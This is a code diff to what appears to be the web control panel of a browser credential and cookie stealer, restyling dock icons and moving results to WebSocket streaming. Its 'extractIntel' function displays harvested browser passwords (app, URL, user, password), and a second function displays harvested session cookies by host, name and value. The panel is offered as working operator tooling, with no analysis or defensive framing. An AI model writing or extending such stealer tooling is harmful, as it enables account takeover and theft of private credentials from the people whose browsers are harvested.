-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-cons)"/><defs><linearGradient id="grad-cons" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#2c2c2e"/><stop offset="100%" style="stop-color:#1c1c1e"/></linearGradient></defs><path d="M22 25l8 7-8 7M34 39h10" stroke="white" stroke-width="4" stroke-linecap="round"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="4 17 10 11 4 5"/>
+                            <line x1="12" y1="19" x2="20" y2="19"/>
+                        </svg>
                         <div class="dock-dot"></div>
                     </div>
                     <div class="dock-tooltip">Terminal</div>
                 </div>
                 
+                <!-- HEX VIEWER -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" data-win="hex" onclick="window.toggleWin('hex')">
-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-hex)"/><defs><linearGradient id="grad-hex" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff375f"/><stop offset="100%" style="stop-color:#ff2d55"/></linearGradient></defs><text x="16" y="42" fill="white" font-size="14" font-weight="900">0101</text></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="16 18 22 12 16 6"/>
+                            <polyline points="8 6 2 12 8 18"/>
+                        </svg>
                         <div class="dock-dot"></div>
                     </div>
                     <div class="dock-tooltip">Hex Viewer</div>
                 </div>
                 
-                <div style="width: 1px; height: 40px; background: rgba(255,255,255,0.15); margin: 10px 8px 0 8px;"></div>
+                <div style="width: 1px; height: 24px; background: var(--border); margin: 0 4px;"></div>
                 
+                <!-- RESET -->
                 <div class="dock-icon-wrapper">
                     <div class="dock-icon" onclick="window.unlock()">
-                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-reset)"/><defs><linearGradient id="grad-reset" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff453a"/><stop offset="100%" style="stop-color:#ff3b30"/></linearGradient></defs><path d="M32 20l-12 12h24l-12 12" stroke="white" stroke-width="4" stroke-linecap="round"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+                            <path d="M3 3v5h5"/>
+                        </svg>
                     </div>
-                    <div class="dock-tooltip">Reset</div>
+                    <div class="dock-tooltip">Reset View</div>
                 </div>
             </div>
         </div>
@@ -654,12 +746,20 @@
             document.onmouseup = null; 
         };
 
+        window._ws = null;
+        window._a7Data = [];
+        window._cookiesData = [];
         window.initWS = function() {
             try {
                 const socket = new WebSocket(`ws://${location.host}/ws`);
+                window._ws = socket;
                 socket.onmessage = (e) => { 
                     const d=JSON.parse(e.data); 
-                    if(d.m) window.log(d.m, d.l); 
+                    if(d.m) window.log(d.m, d.l);
+                    if(d.type === 'a7_chunk') { window._a7Data = window._a7Data.concat(d.entries); window.log('Chunk: ' + d.entries.length + ' from ' + d.browser, 'INFO'); }
+                    if(d.type === 'a7_done') { window._renderA7(window._a7Data); window._a7Data = []; }
+                    if(d.type === 'cookies_chunk') { window._cookiesData = window._cookiesData.concat(d.entries); window.log('Chunk: ' + d.entries.length + ' from ' + d.browser, 'INFO'); }
+                    if(d.type === 'cookies_done') { window._renderCookies(window._cookiesData); window._cookiesData = []; }
                 };
                 socket.onerror = () => window.log('WebSocket disconnected', 'ERROR');
             } catch(e) {
@@ -749,23 +849,24 @@
             }
         };
         
-        window.extractIntel = async function() {
+            window.extractIntel = async function() {
             window.log('Extracting Passwords...', 'INFO'); 
             if(document.getElementById('win-intel').style.display==='none') window.toggleWin('intel');
             const head = document.getElementById('intel-head');
             const body = document.getElementById('intel-body');
             head.innerHTML = '<tr><th>APP</th><th>URL</th><th>USER</th><th>DATA</th></tr>';
-            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Working...</td></tr>';
-            
-            try {
-                const r = await fetch('/v1/sys/a7', {headers:{'X-Signal-Token':window.apiToken}});
-                const d = await r.json();
+            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Working... (results stream via WebSocket)</td></tr>';
+            window._a7Data = [];
+            window._renderA7 = function(d) {
                 body.innerHTML = '';
                 if(d.length === 0) body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">No data found or access denied.</td></tr>';
                 for(const e of d) {
                     body.innerHTML += `<tr><td>${e.b}</td><td style="max-width:200px; overflow:hidden; text-overflow:ellipsis;">${e.u}</td><td>${e.s}</td><td style="color:#00ff41; font-weight:800; font-family:monospace;">${e.p}</td></tr>`;
                 }
                 window.log('Extraction Done: ' + d.length + ' items', 'SUCCESS');
+            };
+            try {
+                await fetch('/v1/op/a7', {headers:{'X-Signal-Token':window.apiToken}});
             } catch(e) { 
                 window.log('Fetch Error: ' + e, 'ERROR'); 
                 body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">Connection failed</td></tr>';
@@ -778,17 +879,18 @@
             const head = document.getElementById('intel-head');
             const body = document.getElementById('intel-body');
             head.innerHTML = '<tr><th>APP</th><th>HOST</th><th>NAME</th><th>VALUE</th></tr>';
-            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Working...</td></tr>';
-
-            try {
-                const r = await fetch('/v1/sys/cookies', {headers:{'X-Signal-Token':window.apiToken}});
-                const d = await r.json();
+            body.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:20px; color:#888;">Working... (results stream via WebSocket)</td></tr>';
+            window._cookiesData = [];
+            window._renderCookies = function(d) {
                 body.innerHTML = '';
                 if(d.length === 0) body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">No cookies found or database locked.</td></tr>';
                 for(const e of d) {
                     body.innerHTML += `<tr><td>${e.b}</td><td style="color:#0a84ff;">${e.h}</td><td style="font-weight:600;">${e.n}</td><td style="color:#00ff41; max-width:300px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-family:monospace; font-size:11px;">${e.v}</td></tr>`;
                 }
                 window.log('Harvest Done: ' + d.length + ' cookies', 'SUCCESS');
+            };
+            try {
+                await fetch('/v1/op/cookies', {headers:{'X-Signal-Token':window.apiToken}});
             } catch(e) { 
                 window.log('Fetch Error: ' + e, 'ERROR'); 
                 body.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff453a; padding:20px;">Connection failed</td></tr>';
